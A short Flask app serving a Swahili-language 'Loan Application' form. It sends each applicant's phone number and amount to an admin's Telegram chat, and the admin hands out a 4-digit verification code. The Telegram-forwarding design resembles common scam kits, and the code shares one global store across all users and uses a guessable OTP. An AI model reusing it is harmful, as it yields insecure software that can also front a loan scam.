from flask import Flask, request, render_template_string
import requests, os, random

app = Flask(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN")  
ADMIN_CHAT_ID = os.getenv("CHAT_ID")

CURRENT_OTP = {}
CURRENT_DATA = {}

FORM_HTML = """
<form action="/submit" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
<h2 style="text-align:center;color:#333;">Loan Application</h2>
<label><b>Phone Number:</b></label><br>
<input name="phone" placeholder="0712xxxxxx" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
<label><b>Loan Amount $:</b></label><br>
<input name="amount" type="number" placeholder="5000" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
<button style="width:100%;padding:12px;background:#28a745;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Apply Now</button>
</form>
"""

OTP_HTML = """
<form action="/verify_otp" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
<h2 style="text-align:center;color:#333;">Verify OTP</h2>
<p style="text-align:center;">Enter the 4-digit code sent by Admin</p>
<label><b>OTP Code:</b></label><br>
<input name="otp" placeholder="1234" maxlength="4" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;text-align:center;font-size:18px;"><br>
<button style="width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Verify</button>
</form>
"""

def send_to_telegram(text, keyboard=None):
    if not TOKEN or not ADMIN_CHAT_ID:
        print("ERROR: TELEGRAM_TOKEN or CHAT_ID hazipo kwenye Environment")
        return
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard: payload["reply_markup"] = keyboard
    requests.post(url, json=payload, timeout=10)

@app.route('/')
def home(): return render_template_string(FORM_HTML)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    CURRENT_DATA['temp'] = data 
    text = f"<b>🚨 New Loan Application</b>\n\n<b>Phone:</b> {data['phone']}\n<b>Amount:</b> ${data['amount']}\n\nBofya chini kutoa OTP kwa mteja"
    keyboard = {"inline_keyboard": [[{"text": "📲 Generate & Send OTP", "callback_data": "generate_otp"}]]}
    send_to_telegram(text, keyboard)
    return "<h3 style='text-align:center; color:orange;margin-top:50px;'>Application received. Subiri admin akupatie OTP.</h3>"

@app.route('/otp_page')
def show_otp(): return render_template_string(OTP_HTML)

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    user_otp = request.form['otp']
    if user_otp == CURRENT_OTP.get('code'):
        data = CURRENT_DATA.get('temp', {})
        text = f"<b>✅ OTP VERIFIED</b>\n\n<b>Phone:</b> {data.get('phone')}\n<b>Amount:</b> ${data.get('amount')}\n<b>OTP:</b> <code>{user_otp}</code>"
        send_to_telegram(text)
        CURRENT_OTP.clear()
        CURRENT_DATA.clear()
        return "<h3 style='text-align:center; color:green;margin-top:50px;'>Asante! Tumeipokea. Tutakupigia hivi karibuni.</h3>"
    else:
        return "<h3 style='text-align:center; color:red;margin-top:50px;'>OTP sio sahihi. Jaribu tena.</h3>"

@app.route(f"/{os.getenv('TELEGRAM_TOKEN','')}", methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if 'callback_query' in update:
        query = update['callback_query']
        if query['data'] == 'generate_otp':
            otp = str(random.randint(1000, 9999))
            CURRENT_OTP['code'] = otp
            send_to_telegram(f"<b>🔑 OTP YAKO:</b> <code>{otp}</code>\n\nMpe mteja aiandike kwenye site")
            send_to_telegram(f"Peana hii link kwa mteja:\n{request.url_root}otp_page")
            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": query['id']})
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
